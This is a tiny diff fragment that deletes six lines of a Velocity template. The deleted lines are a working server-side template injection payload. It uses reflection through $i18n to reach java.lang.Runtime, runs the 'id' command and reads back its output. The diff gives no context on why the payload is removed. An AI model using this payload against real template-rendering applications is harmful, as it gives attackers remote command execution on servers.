@@ -1,6 +1,0 @@
-#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('id'))
-$ex.waitFor()
-#set($out=$ex.getInputStream())
-#foreach($i in [1..$out.available()])
-$out.read()
-#end
